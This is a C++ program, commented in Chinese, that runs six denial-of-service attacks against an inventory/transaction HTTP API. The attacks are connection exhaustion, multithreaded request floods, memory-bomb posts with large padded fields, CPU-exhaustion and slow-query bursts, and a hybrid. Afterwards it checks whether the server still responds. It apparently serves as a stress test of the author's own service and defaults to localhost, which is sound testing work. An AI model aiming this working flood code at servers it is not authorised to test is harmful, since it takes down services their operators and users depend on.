/*
 * 拒绝服务攻击测试程序
 * 目标：通过各种DoS攻击手段测试服务器的可用性和稳定性
 * 编译：g++ -std=c++11 -o dos_attack_test dos_attack_test.cpp -pthread
 * 运行：./dos_attack_test
 */

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <sstream>
#include <cstring>
#include <atomic>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>

class DoSAttackTest {
private:
    std::string server_host;
    int server_port;
    std::random_device rd;
    std::mt19937 gen;
    std::atomic<int> active_connections{0};
    std::atomic<int> total_requests{0};
    std::atomic<bool> attack_running{true};
    
public:
    DoSAttackTest(const std::string& host = "127.0.0.1", int port = 8080) 
        : server_host(host), server_port(port), gen(rd()) {}
    
    // 创建socket连接
    int createConnection() {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return -1;
        
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        inet_pton(AF_INET, server_host.c_str(), &server_addr.sin_addr);
        
        // 设置非阻塞模式以加快连接速度
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
        
        int result = connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
        
        // 恢复阻塞模式
        fcntl(sock, F_SETFL, flags);
        
        if (result < 0 && errno != EINPROGRESS) {
            close(sock);
            return -1;
        }
        
        return sock;
    }
    
    // 发送HTTP请求
    bool sendRequest(int sock, const std::string& request) {
        return send(sock, request.c_str(), request.length(), 0) > 0;
    }
    
    // 攻击1：连接耗尽攻击
    void connectionExhaustionAttack() {
        std::cout << "\n=== 连接耗尽攻击 ===" << std::endl;
        
        const int max_connections = 1000;
        std::vector<int> connections;
        
        std::cout << "尝试创建 " << max_connections << " 个并发连接..." << std::endl;
        
        for (int i = 0; i < max_connections; ++i) {
            int sock = createConnection();
            if (sock >= 0) {
                connections.push_back(sock);
                active_connections++;
                
                // 发送部分请求以保持连接活跃
                std::string partial_request = 
                    "GET /api/managers/exhaust_" + std::to_string(i) + "/transactions HTTP/1.1\r\n"
                    "Host: " + server_host + "\r\n";
                
                sendRequest(sock, partial_request);
                
                if (i % 50 == 0) {
                    std::cout << "已创建 " << i << " 个连接" << std::endl;
                }
            } else {
                std::cout << "连接失败在第 " << i << " 个连接" << std::endl;
                break;
            }
            
            // 短暂延迟以避免太快
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        
        std::cout << "成功创建 " << connections.size() << " 个连接" << std::endl;
        std::cout << "保持连接30秒..." << std::endl;
        
        // 保持连接30秒
        std::this_thread::sleep_for(std::chrono::seconds(30));
        
        // 关闭所有连接
        for (int sock : connections) {
            close(sock);
            active_connections--;
        }
        
        std::cout << "连接耗尽攻击完成" << std::endl;
    }
    
    // 攻击2：请求洪水攻击
    void requestFloodAttack() {
        std::cout << "\n=== 请求洪水攻击 ===" << std::endl;
        
        const int num_threads = 50;
        const int requests_per_thread = 200;
        const int attack_duration = 30; // 秒
        
        std::vector<std::thread> threads;
        auto start_time = std::chrono::steady_clock::now();
        
        std::cout << "启动 " << num_threads << " 个线程，每个线程发送 " << requests_per_thread << " 个请求" << std::endl;
        
        for (int t = 0; t < num_threads; ++t) {
            threads.emplace_back([this, t, requests_per_thread, start_time, attack_duration]() {
                std::uniform_int_distribution<> delay_dis(1, 50);
                
                for (int i = 0; i < requests_per_thread; ++i) {
                    // 检查是否超时
                    auto now = std::chrono::steady_clock::now();
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
                    if (elapsed >= attack_duration) {
                        break;
                    }
                    
                    int sock = createConnection();
                    if (sock >= 0) {
                        std::string manager_id = "flood_" + std::to_string(t) + "_" + std::to_string(i);
                        
                        // 随机选择请求类型
                        std::uniform_int_distribution<> type_dis(0, 3);
                        std::string request;
                        
                        switch (type_dis(gen)) {
                            case 0: // GET transactions
                                request = 
                                    "GET /api/managers/" + manager_id + "/transactions HTTP/1.1\r\n"
                                    "Host: " + server_host + "\r\n"
                                    "Connection: close\r\n\r\n";
                                break;
                                
                            case 1: // GET inventory
                                request = 
                                    "GET /api/managers/" + manager_id + "/inventory HTTP/1.1\r\n"
                                    "Host: " + server_host + "\r\n"
                                    "Connection: close\r\n\r\n";
                                break;
                                
                            case 2: // POST transaction
                                {
                                    std::string json_body = R"({"trans_id":"flood_)" + 
                                        std::to_string(total_requests.fetch_add(1)) + 
                                        R"(","item_id":"flood_item","type":"in","quantity":1})";
                                    
                                    request = 
                                        "POST /api/managers/" + manager_id + "/transactions HTTP/1.1\r\n"
                                        "Host: " + server_host + "\r\n"
                                        "Content-Type: application/json\r\n"
                                        "Content-Length: " + std::to_string(json_body.length()) + "\r\n"
                                        "Connection: close\r\n\r\n" + json_body;
                                }
                                break;
                                
                            case 3: // GET statistics
                                request = 
                                    "GET /api/managers/" + manager_id + "/statistics HTTP/1.1\r\n"
                                    "Host: " + server_host + "\r\n"
                                    "Connection: close\r\n\r\n";
                                break;
                        }
                        
                        sendRequest(sock, request);
                        close(sock);
                        
                        // 随机延迟
                        std::this_thread::sleep_for(std::chrono::milliseconds(delay_dis(gen)));
                    }
                }
            });
        }
        
        // 监控线程
        std::thread monitor([this, start_time, attack_duration]() {
            while (attack_running) {
                auto now = std::chrono::steady_clock::now();
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
                
                if (elapsed >= attack_duration) {
                    attack_running = false;
                    break;
                }
                
                std::cout << "攻击进行中... 已发送 " << total_requests.load() << " 个请求 ("
                          << elapsed << "/" << attack_duration << "s)" << std::endl;
                
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        });
        
        for (auto& thread : threads) {
            thread.join();
        }
        
        attack_running = false;
        monitor.join();
        
        std::cout << "请求洪水攻击完成，总共发送了 " << total_requests.load() << " 个请求" << std::endl;
    }
    
    // 攻击3：内存炸弹攻击
    void memoryBombAttack() {
        std::cout << "\n=== 内存炸弹攻击 ===" << std::endl;
        
        const int num_managers = 100;
        const int transactions_per_manager = 1000;
        
        std::cout << "创建 " << num_managers << " 个管理员，每个有 " << transactions_per_manager << " 个大体积交易" << std::endl;
        
        for (int m = 0; m < num_managers; ++m) {
            std::string manager_id = "memory_bomb_" + std::to_string(m);
            
            for (int t = 0; t < transactions_per_manager; ++t) {
                int sock = createConnection();
                if (sock >= 0) {
                    // 创建大体积的交易记录
                    std::string trans_id = "bomb_" + std::to_string(m) + "_" + std::to_string(t);
                    std::string large_item_id = std::string(5000, 'I'); // 5KB item_id
                    std::string large_item_name = std::string(5000, 'N'); // 5KB item_name
                    std::string large_note = std::string(10000, 'Z'); // 10KB note
                    
                    std::string json_body = R"({"trans_id":")" + trans_id + 
                                          R"(","item_id":")" + large_item_id + 
                                          R"(","item_name":")" + large_item_name + 
                                          R"(","type":"in","quantity":9999,"note":")" + large_note + R"("})";
                    
                    std::string request = 
                        "POST /api/managers/" + manager_id + "/transactions HTTP/1.1\r\n"
                        "Host: " + server_host + "\r\n"
                        "Content-Type: application/json\r\n"
                        "Content-Length: " + std::to_string(json_body.length()) + "\r\n"
                        "Connection: close\r\n\r\n" + json_body;
                    
                    sendRequest(sock, request);
                    close(sock);
                }
                
                if (t % 100 == 0) {
                    std::cout << "管理员 " << m << " 已创建 " << t << " 个交易" << std::endl;
                }
            }
        }
        
        std::cout << "内存炸弹攻击完成，总共创建了 " << (num_managers * transactions_per_manager) << " 个大体积交易记录" << std::endl;
    }
    
    // 攻击4：CPU耗尽攻击
    void cpuExhaustionAttack() {
        std::cout << "\n=== CPU耗尽攻击 ===" << std::endl;
        
        const int num_threads = 20;
        const int attack_duration = 30; // 秒
        
        std::vector<std::thread> threads;
        auto start_time = std::chrono::steady_clock::now();
        
        std::cout << "启动 " << num_threads << " 个线程进行CPU密集型攻击，持续 " << attack_duration << " 秒" << std::endl;
        
        for (int t = 0; t < num_threads; ++t) {
            threads.emplace_back([this, t, start_time, attack_duration]() {
                int request_count = 0;
                
                while (true) {
                    auto now = std::chrono::steady_clock::now();
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
                    if (elapsed >= attack_duration) {
                        break;
                    }
                    
                    int sock = createConnection();
                    if (sock >= 0) {
                        std::string manager_id = "cpu_exhaust_" + std::to_string(t);
                        
                        // 发送复杂查询请求来消耗CPU
                        std::vector<std::string> cpu_intensive_requests = {
                            // 时间范围查询
                            "GET /api/managers/" + manager_id + "/transactions?start_time=2000-01-01&end_time=2099-12-31 HTTP/1.1\r\n",
                            
                            // 库存计算
                            "GET /api/managers/" + manager_id + "/inventory HTTP/1.1\r\n",
                            
                            // 统计查询
                            "GET /api/managers/" + manager_id + "/statistics HTTP/1.1\r\n",
                            
                            // 物品查询
                            "GET /api/managers/" + manager_id + "/items HTTP/1.1\r\n",
                        };
                        
                        for (const std::string& req_line : cpu_intensive_requests) {
                            std::string full_request = req_line + 
                                "Host: " + server_host + "\r\n"
                                "Connection: close\r\n\r\n";
                            
                            sendRequest(sock, full_request);
                        }
                        
                        close(sock);
                        request_count++;
                    }
                    
                    // 无延迟，最大化CPU使用
                }
                
                std::cout << "线程 " << t << " 完成，发送了 " << request_count << " 个CPU密集型请求" << std::endl;
            });
        }
        
        for (auto& thread : threads) {
            thread.join();
        }
        
        std::cout << "CPU耗尽攻击完成" << std::endl;
    }
    
    // 攻击5：慢速查询攻击
    void slowQueryAttack() {
        std::cout << "\n=== 慢速查询攻击 ===" << std::endl;
        
        // 首先创建大量数据
        std::cout << "准备数据：创建大量交易记录..." << std::endl;
        
        const int setup_managers = 10;
        const int setup_transactions = 5000;
        
        for (int m = 0; m < setup_managers; ++m) {
            std::string manager_id = "slow_query_" + std::to_string(m);
            
            for (int t = 0; t < setup_transactions; ++t) {
                int sock = createConnection();
                if (sock >= 0) {
                    std::string json_body = R"({"trans_id":"setup_)" + std::to_string(m * setup_transactions + t) + 
                                          R"(","item_id":"item_)" + std::to_string(t % 100) + 
                                          R"(","type":")" + (t % 2 == 0 ? "in" : "out") + 
                                          R"(","quantity":)" + std::to_string(t % 1000 + 1) + R"(})";
                    
                    std::string request = 
                        "POST /api/managers/" + manager_id + "/transactions HTTP/1.1\r\n"
                        "Host: " + server_host + "\r\n"
                        "Content-Type: application/json\r\n"
                        "Content-Length: " + std::to_string(json_body.length()) + "\r\n"
                        "Connection: close\r\n\r\n" + json_body;
                    
                    sendRequest(sock, request);
                    close(sock);
                }
            }
            
            std::cout << "管理员 " << m << " 数据准备完成" << std::endl;
        }
        
        // 执行慢速查询攻击
        std::cout << "开始慢速查询攻击..." << std::endl;
        
        std::vector<std::thread> threads;
        
        for (int t = 0; t < 10; ++t) {
            threads.emplace_back([this, t, setup_managers]() {
                for (int i = 0; i < 50; ++i) {
                    int sock = createConnection();
                    if (sock >= 0) {
                        int manager_idx = i % setup_managers;
                        std::string manager_id = "slow_query_" + std::to_string(manager_idx);
                        
                        // 各种慢速查询
                        std::vector<std::string> slow_queries = {
                            // 大范围时间查询
                            "GET /api/managers/" + manager_id + "/transactions?start_time=1900-01-01&end_time=2100-12-31 HTTP/1.1\r\n",
                            
                            // 库存计算（需要遍历所有交易）
                            "GET /api/managers/" + manager_id + "/inventory HTTP/1.1\r\n",
                            
                            // 统计查询
                            "GET /api/managers/" + manager_id + "/statistics HTTP/1.1\r\n",
                            
                            // 文档查询
                            "GET /api/managers/" + manager_id + "/documents HTTP/1.1\r\n",
                        };
                        
                        for (const std::string& query : slow_queries) {
                            std::string request = query + 
                                "Host: " + server_host + "\r\n"
                                "Connection: close\r\n\r\n";
                            
                            sendRequest(sock, request);
                        }
                        
                        close(sock);
                    }
                }
            });
        }
        
        for (auto& thread : threads) {
            thread.join();
        }
        
        std::cout << "慢速查询攻击完成" << std::endl;
    }
    
    // 攻击6：混合DoS攻击
    void hybridDoSAttack() {
        std::cout << "\n=== 混合DoS攻击 ===" << std::endl;
        
        const int attack_duration = 60; // 秒
        auto start_time = std::chrono::steady_clock::now();
        
        std::vector<std::thread> threads;
        
        // 连接耗尽线程
        threads.emplace_back([this, start_time, attack_duration]() {
            std::vector<int> connections;
            
            while (true) {
                auto now = std::chrono::steady_clock::now();
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
                if (elapsed >= attack_duration) break;
                
                int sock = createConnection();
                if (sock >= 0) {
                    connections.push_back(sock);
                    if (connections.size() > 200) {
                        close(connections.front());
                        connections.erase(connections.begin());
                    }
                }
                
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
            
            for (int sock : connections) {
                close(sock);
            }
        });
        
        // 请求洪水线程
        for (int i = 0; i < 5; ++i) {
            threads.emplace_back([this, start_time, attack_duration, i]() {
                int request_count = 0;
                
                while (true) {
                    auto now = std::chrono::steady_clock::now();
                    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
                    if (elapsed >= attack_duration) break;
                    
                    int sock = createConnection();
                    if (sock >= 0) {
                        std::string manager_id = "hybrid_" + std::to_string(i);
                        std::string json_body = R"({"trans_id":"hybrid_)" + std::to_string(request_count++) + 
                                              R"(","item_id":"test","type":"in","quantity":1})";
                        
                        std::string request = 
                            "POST /api/managers/" + manager_id + "/transactions HTTP/1.1\r\n"
                            "Host: " + server_host + "\r\n"
                            "Content-Type: application/json\r\n"
                            "Content-Length: " + std::to_string(json_body.length()) + "\r\n"
                            "Connection: close\r\n\r\n" + json_body;
                        
                        sendRequest(sock, request);
                        close(sock);
                    }
                    
                    std::this_thread::sleep_for(std::chrono::milliseconds(50));
                }
            });
        }
        
        // 内存攻击线程
        threads.emplace_back([this, start_time, attack_duration]() {
            int manager_count = 0;
            
            while (true) {
                auto now = std::chrono::steady_clock::now();
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
                if (elapsed >= attack_duration) break;
                
                std::string manager_id = "hybrid_memory_" + std::to_string(manager_count++);
                
                for (int i = 0; i < 100; ++i) {
                    int sock = createConnection();
                    if (sock >= 0) {
                        std::string large_data = std::string(2000, 'X');
                        std::string json_body = R"({"trans_id":"memory_)" + std::to_string(i) + 
                                              R"(","item_id":")" + large_data + 
                                              R"(","type":"in","quantity":1})";
                        
                        std::string request = 
                            "POST /api/managers/" + manager_id + "/transactions HTTP/1.1\r\n"
                            "Host: " + server_host + "\r\n"
                            "Content-Type: application/json\r\n"
                            "Content-Length: " + std::to_string(json_body.length()) + "\r\n"
                            "Connection: close\r\n\r\n" + json_body;
                        
                        sendRequest(sock, request);
                        close(sock);
                    }
                }
                
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        });
        
        std::cout << "混合DoS攻击运行中，持续 " << attack_duration << " 秒..." << std::endl;
        
        for (auto& thread : threads) {
            thread.join();
        }
        
        std::cout << "混合DoS攻击完成" << std::endl;
    }
    
    // 运行所有DoS攻击
    void runAllAttacks() {
        std::cout << "🔥 开始拒绝服务攻击测试 - 目标服务器: " << server_host << ":" << server_port << std::endl;
        std::cout << "⚠️  警告：这些攻击可能会导致服务器过载或崩溃！" << std::endl;
        
        connectionExhaustionAttack();
        requestFloodAttack();
        memoryBombAttack();
        cpuExhaustionAttack();
        slowQueryAttack();
        hybridDoSAttack();
        
        std::cout << "\n🏁 所有拒绝服务攻击完成" << std::endl;
        std::cout << "服务器状态检查：" << std::endl;
        
        // 尝试发送一个正常请求检查服务器是否还能响应
        int test_sock = createConnection();
        if (test_sock >= 0) {
            std::string test_request = 
                "GET /api/managers/test/transactions HTTP/1.1\r\n"
                "Host: " + server_host + "\r\n"
                "Connection: close\r\n\r\n";
            
            if (sendRequest(test_sock, test_request)) {
                char buffer[1024];
                int bytes = recv(test_sock, buffer, sizeof(buffer), 0);
                if (bytes > 0) {
                    std::cout << "✅ 服务器仍然响应正常请求" << std::endl;
                } else {
                    std::cout << "❌ 服务器无响应" << std::endl;
                }
            } else {
                std::cout << "❌ 无法发送测试请求" << std::endl;
            }
            close(test_sock);
        } else {
            std::cout << "❌ 无法连接到服务器" << std::endl;
        }
    }
};

int main() {
    DoSAttackTest test;
    test.runAllAttacks();
    return 0;
}